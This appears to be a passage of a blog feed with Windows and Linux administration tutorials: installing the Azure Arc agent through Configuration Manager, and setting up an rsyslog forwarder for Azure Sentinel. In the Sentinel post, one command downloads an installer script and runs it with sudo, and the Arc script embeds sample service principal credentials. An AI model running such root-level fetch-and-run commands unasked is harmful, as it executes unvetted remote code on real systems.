    &lt;p&gt;&lt;strong&gt;Add products and classifications to Software Update Catalog and manage using Software Update Management (recommended)&lt;/strong&gt;: This approach leverages the existing process in your organization using Configuration Manager to also update Azure Arc.&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;The following products and classifications need to be selected and synchronized in your Software Update Point. The details on how to enable them is available on &lt;a href=&quot;https://docs.microsoft.com/en-us/mem/configmgr/sum/get-started/configure-classifications-and-products&quot;&gt;this link&lt;/a&gt;:&lt;/p&gt;

        &lt;table&gt;
          &lt;thead&gt;
            &lt;tr&gt;
              &lt;th&gt;Setting&lt;/th&gt;
              &lt;th&gt;Value to be selected&lt;/th&gt;
            &lt;/tr&gt;
          &lt;/thead&gt;
          &lt;tbody&gt;
            &lt;tr&gt;
              &lt;td&gt;Products&lt;/td&gt;
              &lt;td&gt;Microsoft &amp;gt; Azure Connected Machine Agent&lt;/td&gt;
            &lt;/tr&gt;
            &lt;tr&gt;
              &lt;td&gt;Classification&lt;/td&gt;
              &lt;td&gt;Critical Updates&lt;/td&gt;
            &lt;/tr&gt;
          &lt;/tbody&gt;
        &lt;/table&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;As we could see in this post, the process of using Configuration Manager for deploying and updating Azure Arc is quite simple, needing a few adjustments to do not only the install process but also the onboarding.&lt;/p&gt;

&lt;p&gt;In the official documentation we have other deployment methods available, which can be seen in their respective articles:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-dsc&quot;&gt;Install Connected Machine agent using Windows PowerShell DSC - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-windows-admin-center&quot;&gt;Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://docs.microsoft.com/en-us/azure/azure-arc/servers/onboard-powershell&quot;&gt;Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hope that the shared information be useful to you, making easier to deploy Azure Arc from ConfigMgr.&lt;/p&gt;

&lt;p&gt;See you in the next post! :smile:&lt;/p&gt;</content><author><name>Davi Cruz</name></author><category term="Azure Arc" /><category term="Azure" /><category term="Arc" /><category term="Windows" /><category term="ConfigMgr" /><category term="MECM" /><category term="MEM" /><summary type="html">In this post I’ll be guiding you through the process of deploying and updating Azure Arc for Servers (Windows) via Microsoft Endpoint Manager Configuration Manager - MECM (aka SCCM). The process is pretty simple, but some small tips are shared to help you to take the most of this powerful configuration management solution for this task :smile:. :information_source: Note: The scripts shared in this post can also be used from other configuration management tools, but they might require some changes to work. Azure Arc enabled Servers Azure Arc allows the management of physical and virtual servers not hosted on Azure to be managed though the Azure Portal console, allowing you to manage extensions, updates, and guest policies in a consistent manner, just like you can do for native Azure Virtual Machines. Azure Arc is an important asset so you can benefit from features like Azure Defender Vulnerability Assessment, as well as deploying and managing other extensions like Microsoft Monitoring Agent (MMA) e the new Azure Monitor Agent (AMA). Pricing According to Azure Arc – Azure Management | Microsoft Azure, features related to Azure control plane (installing extensions, ARM Templates, etc.) can be used at no cost, as well as the Azure Update Management. Features related to Azure Policy Guest Configurations (Automation, Inventory, State Configuration) and other services you may be able to connect to using Arc (Azure Defender and Azure Monitor, for example) are charged according to its respective pricing table, which can be checked directly from Azure Pricing Calculator. Pre-requisites Some pre-requisites need to be observed to make this install possible, where details can be check on the link Overview of the Connected Machine agent - Azure Arc | Microsoft Docs: A supported Operating System. Azure Arc URLs allowed for communication, vide above mentioned link Depending on your environment, defining a proxy server might be required. Some extensions you install from Arc might need additional URLs to ensure their proper functioning. Provisioning of a Service Principal to onboard clients to Arc silently. Details of how to provision this object is described in Connect hybrid machines to Azure at scale - Azure Arc | Microsoft Docs. Enable Microsoft.HybridCompute and Microsoft.GuestConfiguration resource providers, according to Connect hybrid machine with Azure Arc enabled servers - Azure Arc | Microsoft Docs. Management via Configuration Manager If your organization already uses Configuration Manager for device management, it can be also used to install and update Azure Machine Connected Agent, which is used by Azure Arc. Agent Install Using Configuration Manager Applications, we can ensure that this agent is installed properly in the devices we aim to manage, getting a better control of the results of the install process. Below I describe de instructions on how to create this resource: Download the latest release of Arc installer for Windows: The binary can be downloaded directly from the shortened URL https://aka.ms/AzureConnectedMachineAgent. Powershell command below can be used to download and store it to a specified location. The file needs to be stored in a File Share accessible by MECM to be used as content source. $destinationPath = &quot;c:\path\to\file&quot; Invoke-WebRequest -Uri https://aka.ms/AzureConnectedMachineAgent -OutFile &quot;$destinationPath\AzureConnectedMachineAgent.msi&quot; Download and edit the Install-AzureArcMECM.ps1 script filling the variables just like the sample below. This script needs to be placed in the same directory as the *.msi we’ve just downloaded. If your servers require a proxy for Internet communication, fill the variable $proxyUrl with its path, otherwise leave it blank. The shared script, besides installing the agent, also configures proxy (if informed) and connects the agent to Arc service using the credentials specified: ## Variables $installLogFile = &quot;c:\Windows\Temp\AzureArcSetup.log&quot; $tenantID = &quot;7482a3c1-7102-4a0d-9dfb-0aa2186ce450&quot; $subscriptionID = &quot;48a0ab65-bd82-4aac-9283-99344f387d9b&quot; $ResourceGroupName = &quot;rg-azurearc-windows&quot; $serviceprincipalAppID = &quot;909e06f7-577c-45b9-b49e-eff9e6560ef6&quot; $serviceprincipalSecret = &quot;f53f0a59-6db3-4ac7-b861-e760d29240d8&quot; $resourceLocation = &quot;eastus&quot; $proxyUrl = &quot;&quot; # Format: http[s]://server.fqdn:port ### Sample data provided for illustration purposes Create the Application from MECM console accessing Software Library &amp;gt; Application Management &amp;gt; Applications and selecting the option Create Application in the ribbon or on context menu from Application. Select the UNC path for the downloaded *.msi and click Next. Click Next to proceed after validating the information shown about the installer used. In General Information, replace the preconfigured command line with the one provided below, so the install process will happen from PowerShell and hit Next. %windir%\System32\WindowsPowerShell\v1.0\powershell.exe -File .\Install-AzureArcMECM.ps1 :bulb: Tip: Fill in the other requested information for this application, which will enrich the application catalog and make it easier to administer it later. Review all the provided information and click Next to create the resource. After completion, the select Close for this success message. After creating this application, we need to adjust a few details so it can work in a more adequate way: Access the deployment type settings by navigating to the application &amp;gt; Deployment Types tab &amp;gt; right click the existing deployment and select Properties. Under Detection Method tab, select the option Use a custom script to detect the presence of this deployment type and click Edit. Select the PowerShell script type and paste the snipped provided below, hitting OK to confirm. This detection script will check not only if the agent is installed but also if it’s connected to Arc before and after the install process. :warning: Alert: Is important that this script only return an output if the software is installed. Any output is interpreted by ConfigMgr as installed. # Detection Method: Returns the installed version if properly installed try{ $agentDetails = &amp;amp; &quot;$env:ProgramW6432\AzureConnectedMachineAgent\azcmagent.exe&quot; show $agentStatus = ($agentDetails | Where-Object {$_ -like '*Agent Status*'}).Split(&quot;: &quot;)[-1] if($agentStatus -eq 'Connected' ){ Write-Output ($agentDetails | Where-Object {$_ -like '*Agent Version*'}).Split(&quot;: &quot;)[-1] } } catch{ # Returns nothing if not installed } On Requirements tab we need also to define the supported Operating System versions we’re targeting. This also avoids accidental deployments installing Arc Agent on unsupported devices, like Windows Clients. After these final adjustments, click OK to finish the configuration. At this moment, the Application is ready to be deployed to your servers and the process involved in this task is described in this official Microsoft reference. Updating the agent According to the docs, Azure Arc can be updated manually or using WSUS for Windows Operating Systems. In this case we can leverage ConfigMgr in both ways: Creating another application for the newer version: This mechanism requires more administration effort from ConfigMgr but can be achieved by duplicating the application and replacing the installation binaries. If you desire to proceed with this, your detection method will need to be enhanced by looking for a specific Arc Version. Is also important that, if you go through this path, a supersedence relation be created between these apps, as you can learn more in this link. It allows that, for the existing deployments of older versions, the latest app available be used, as well as allowing you to set the behavior for the devices where the app already installed, that can be update or uninstall. Add products and classifications to Software Update Catalog and manage using Software Update Management (recommended): This approach leverages the existing process in your organization using Configuration Manager to also update Azure Arc. The following products and classifications need to be selected and synchronized in your Software Update Point. The details on how to enable them is available on this link: Setting Value to be selected Products Microsoft &amp;gt; Azure Connected Machine Agent Classification Critical Updates Conclusion As we could see in this post, the process of using Configuration Manager for deploying and updating Azure Arc is quite simple, needing a few adjustments to do not only the install process but also the onboarding. In the official documentation we have other deployment methods available, which can be seen in their respective articles: Install Connected Machine agent using Windows PowerShell DSC - Azure Arc | Microsoft Docs Connect hybrid machines to Azure from Windows Admin Center - Azure Arc | Microsoft Docs Connect hybrid machines to Azure by using PowerShell - Azure Arc | Microsoft Docs Hope that the shared information be useful to you, making easier to deploy Azure Arc from ConfigMgr. See you in the next post! :smile:</summary></entry><entry><title type="html">Azure Sentinel: Log Forwarder Configuration</title><link href="https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/" rel="alternate" type="text/html" title="Azure Sentinel: Log Forwarder Configuration" /><published>2021-03-29T12:00:00-03:00</published><updated>2021-04-30T16:00:00-03:00</updated><id>https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder</id><content type="html" xml:base="https://davicruz.com/azure-sentinel/2021/03/rsyslog-sentinel-log-forwarder/">&lt;p&gt;Often I help customers on deploying CEF/Syslog forwarders in their environments to gather data from Network Appliances and/or other servers and services into Log Analytics, which is consequently available for Azure Sentinel.&lt;/p&gt;

&lt;p&gt;Besides having plenty documentation on how to do this deployment, as well as other community resources like Tech Community and Webinars, I have compiled all the resources I normally review with my customers during this deployment or revision in their environments.&lt;/p&gt;

&lt;div class=&quot;notice--success&quot;&gt;

&lt;p&gt;:newspaper: &lt;strong&gt;Edits&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;30/04/2021&lt;/strong&gt; - Added section &lt;a href=&quot;#repeated-message-reduction&quot;&gt;Repeated message reduction&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;/div&gt;

&lt;h2 id=&quot;requirements&quot;&gt;Requirements&lt;/h2&gt;

&lt;p&gt;According to &lt;a href=&quot;https://docs.microsoft.com/en-us/azure/sentinel/connect-common-event-format&quot;&gt;Microsoft’s official documentation&lt;/a&gt;, the requirement for this resource is quite simple as listed below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;4 CPUs and 8GB RAM, which is capable of handling up to 8500 EPS (events per second) using rsyslog, as stated in the docs.
    &lt;ul&gt;
      &lt;li&gt;If you’re deploying this infrastructure in Azure you can use the SKU &lt;strong&gt;Standard_F4s_v2&lt;/strong&gt; which is compute optimized, recommended in this case.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;A Microsoft Monitoring Agent (aka omsagent) supported Linux distribution.&lt;/li&gt;
  &lt;li&gt;Python version 2.7 or 3.&lt;/li&gt;
  &lt;li&gt;One of the supported syslog daemons installed. The most common scenarios I came across uses &lt;strong&gt;rsyslog&lt;/strong&gt;, once it normally is the default package for most of the distributions. Below I list the versions supported as stated in the docs:
    &lt;ul&gt;
      &lt;li&gt;Rsyslog v8&lt;/li&gt;
      &lt;li&gt;Syslog-ng 2.1 - 3.22.1&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;forwarder-architecture&quot;&gt;Forwarder Architecture&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/t2cvlm7.png&quot; alt=&quot;Forwarder Architecture&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Forwarder architecture is simple:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;It is composed by one or more machines receiving the logs on syslog protocol over UDP, TCP or TLS. This is done by using rsyslog or syslog-ng daemon configurations, like any standard syslog server you might be already running in your environment.&lt;/li&gt;
  &lt;li&gt;The received messages are forwarded to local listeners configured on omsagent to parse data as raw Syslog messages (UDP/25224) or CEF (TCP/25226).&lt;/li&gt;
  &lt;li&gt;Messages are sent to Log Analytics Workspace according to its configuration, making them available to Sentinel.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now I’ll walk you through the detailed configuration of this service and sharing some tips of actions I have implemented along with some customers to mitigate some issues and reduce churn in their environment.&lt;/p&gt;

&lt;h3 id=&quot;design-considerations&quot;&gt;Design considerations&lt;/h3&gt;

&lt;p&gt;Before deploying/reviewing your forwarder infrastructure there are some questions you need to answer that will help you to properly define your configuration:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Is this forwarder handling only CEF or Syslog messages or both log types?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Besides both will be received through syslog protocol, CEF messages are parsed by omsagent according to its standard, making each field available in their own columns in Log Analytics while syslog messages are stored in a single column, requiring the proper parsing when inspecting the information contained on them.&lt;/li&gt;
      &lt;li&gt;Also, if you’re using the forwarder for both purposes, we need to prevent that messages sent as CEF be also stored as Syslog, which will incur in &lt;strong&gt;double charging&lt;/strong&gt; for your workspace.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;What are the facilities and severities, as well as message type and sources being forwarded to Sentinel?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;Over sending data to Sentinel can also be costly if you don’t filter them properly.&lt;/li&gt;
      &lt;li&gt;Consider map the detection scenarios based in &lt;a href=&quot;https://attack.mitre.org/matrices/enterprise/&quot;&gt;MITRE ATT&amp;amp;CK Matrix Techniques&lt;/a&gt; you’re hunting for before sending the data. This way you can avoid sending data without a purpose to your SIEM, which won’t give you any return over the investment made in the log storage and Sentinel analytics.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;What are the security requirements for this communication?&lt;/strong&gt;
    &lt;ul&gt;
      &lt;li&gt;As stated in &lt;a href=&quot;https://techcommunity.microsoft.com/t5/azure-sentinel/best-practices-for-common-event-format-cef-collection-in-azure/ba-p/969990&quot;&gt;this best practice post&lt;/a&gt; shared by Cristhofer Romeo Muñoz, &lt;strong&gt;TCP should be used as default protocol&lt;/strong&gt; for every communication due to its reliability, unless your appliance only supports UDP or if you must use encryption in this communication, adopting TLS when this data is being sent over the Internet or you might have sensitive data being sent.&lt;/li&gt;
      &lt;li&gt;Deploying the forwarder machine closer to the source also helps on reduce complexity on protocols used, as well as avoid performance issues caused by high latency between this communication.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;installation&quot;&gt;Installation&lt;/h2&gt;

&lt;p&gt;The initial installation can be easily achieved by running the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cef_installer.py&lt;/code&gt; from &lt;a href=&quot;https://github.com/Azure/Azure-Sentinel/blob/master/DataConnectors/CEF/cef_installer.py&quot;&gt;Official Github Repository&lt;/a&gt; using the command line below, which can be obtained for your environment by accessing the &lt;strong&gt;Common Event Format (CEF)&lt;/strong&gt; connector page in Sentinel or simply by replacing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;workspace id&amp;gt;&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;workspace secret&amp;gt;&lt;/code&gt; by yours.&lt;/p&gt;

&lt;p class=&quot;notice--info&quot;&gt;:bulb: &lt;strong&gt;Note&lt;/strong&gt;: If you don’t have python 2.7 in your system you might need to replace &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3&lt;/code&gt; prior to executing the line below.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-O&lt;/span&gt; cef_installer.py https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/DataConnectors/CEF/cef_installer.py &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python cef_installer.py &amp;lt;workspace &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &amp;lt;workspace secret&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If your forwarder machine requires a proxy for communication, you need also to update proxy settings by modifying the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/opt/microsoft/omsagent/proxy.conf&lt;/code&gt; file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;proxyconf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;http://user:password@proxyserver:3128&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#user:password can be ignored if you proxy doesn't require authentication&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$proxyconf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;/etc/opt/microsoft/omsagent/proxy.conf
&lt;span class=&quot;nb&quot;&gt;sudo chown &lt;/span&gt;omsagent:omiusers /etc/opt/microsoft/omsagent/proxy.conf

&lt;span class=&quot;c&quot;&gt;#restart service&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /opt/microsoft/omsagent/bin/service_control restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This install script performs the changes below to your system. Mostly of them requires connectivity to Github once the reference configurations are located at &lt;a href=&quot;https://github.com/Azure/Azure-Sentinel&quot;&gt;Azure Sentinel’s official repository&lt;/a&gt;:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Download and install Microsoft Monitoring Agent for Linux.&lt;/li&gt;
  &lt;li&gt;Configures omsagent to listen to TCP/25226 and properly handle CEF messages by copying the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security_events.conf&lt;/code&gt; under workspace configuration (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/opt/microsoft/omsagent/&amp;lt;workspaceID&amp;gt;/conf/omsagent.d&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;Forwards Messages matching ASA and CEF events to TCP/25226 by copying the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;security-config-omsagent.conf&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/syslog-ng/conf.d/&lt;/code&gt;, depending on your syslog daemon.&lt;/li&gt;
  &lt;li&gt;Enables syslog daemon to listen to TCP/514 e UDP/514 for inbound communication at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/syslog-ng/syslog-ng.conf&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;With this configuration you might be ready to forward the CEF messages to your machine, which will be sooner available in your Log Analytics workspace at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonSecurityLog&lt;/code&gt; table but there are some other changes described here that you might benefit to collect also raw syslog messages, as well as implement further filtering and adjustment in this infrastructure.&lt;/p&gt;

&lt;h2 id=&quot;configuration&quot;&gt;Configuration&lt;/h2&gt;

&lt;p&gt;As we saw the log forwarder infrastructure is based in the syslog daemon + omsagent. As the &lt;strong&gt;rsyslog&lt;/strong&gt; is one of the most popular daemons used, once it comes with most of the distributions today, I’ll be doing all configurations using it as reference, but you can easily adjust the syntax also for syslog-ng if necessary.&lt;/p&gt;

&lt;h3 id=&quot;rsyslog-version-check-and-install&quot;&gt;Rsyslog version Check and install&lt;/h3&gt;

&lt;p&gt;As stated in our docs we need to be running rsyslog v8. To confirm the running version on your system you can run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsyslogd -v&lt;/code&gt;, which will give an output like the example below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rsyslogd &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
rsyslogd 8.32.0, compiled with:
        PLATFORM:                               x86_64-pc-linux-gnu
        PLATFORM &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;lsb_release &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
        FEATURE_REGEXP:                         Yes
        GSSAPI Kerberos 5 support:              Yes
        FEATURE_DEBUG &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;debug build, slow code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: No
        32bit Atomic operations supported:      Yes
        64bit Atomic operations supported:      Yes
        memory allocator:                       system default
        Runtime Instrumentation &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;slow code&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:    No
        uuid support:                           Yes
        systemd support:                        Yes
        Number of Bits &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;RainerScript integers: 64
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;According to the &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/installation/index.html&quot;&gt;project documentation&lt;/a&gt;, you should be fine running the latest version provided by your distribution repository unless some bugfix is not backported to it. In this case you might need to download the latest build provided or install from source.&lt;/p&gt;

&lt;h3 id=&quot;reloading-rsyslog-configuration&quot;&gt;Reloading rsyslog configuration&lt;/h3&gt;

&lt;p&gt;After any change made to main rsyslog configuration file (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;) or any other file imported by it (normally located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.d/*.conf&lt;/code&gt;) you need to restart the daemon so the changes are made effective. This can be achieved by running the command below:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;systemctl restart rsyslog.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;adjusting-rsyslog-listeners&quot;&gt;Adjusting rsyslog listeners&lt;/h3&gt;

&lt;p&gt;Besides the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cef_installer.py&lt;/code&gt; already defines a listener for TCP/514 and UDP/514, you might require additional configuration to encrypt communication using TLS.&lt;/p&gt;

&lt;p&gt;Your configuration for TCP and UDP should look like the sample below, which is an excerpt from file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/rsyslog.conf&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imuxsock&quot;) # provides support for local system logging&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;#module(load=&quot;immark&quot;)  # provides --MARK-- message capability
&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# provides UDP syslog reception
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imudp&quot;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imudp&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;port=&quot;514&quot;) &lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# provides TCP syslog reception
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;port=&quot;514&quot;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;For TLS Configuration there’s some additional work required, where need to issue the certificates for servers and clients (if you’re not using an internal PKI) as well as make the required changes to rsyslog daemon to accept these encrypted communications.&lt;/p&gt;

&lt;p&gt;More details and sample configurations can be found in official documentation at &lt;a href=&quot;https://www.rsyslog.com/doc/v8-stable/tutorials/tls_cert_summary.html&quot;&gt;this link&lt;/a&gt;, from where the excerpt below was extracted to give you an idea of how this configuration looks like:&lt;/p&gt;

&lt;div class=&quot;language-ini highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imuxsock&quot;) # local messages&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;module(&lt;/span&gt;&lt;span class=&quot;py&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# TCP listener
&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;StreamDriver.Name=&quot;gtls&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;StreamDriver.Mode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# run driver in TLS-only mode
&lt;/span&gt;    &lt;span class=&quot;s&quot;&gt;StreamDriver.Authmode=&quot;anon&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# make gtls driver the default and set certificate files
&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;global(&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;gtls&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverCAFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/ca.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverCertFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/cert.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;DefaultNetstreamDriverKeyFile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/path/to/contrib/gnutls/key.pem&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;c&quot;&gt;# start up listener at port 6514
&lt;/span&gt;    &lt;span class=&quot;err&quot;&gt;input(&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;imtcp&quot;&lt;/span&gt;
    &lt;span class=&quot;py&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;6514&quot;&lt;/span&gt;
    &lt;span class=&quot;err&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

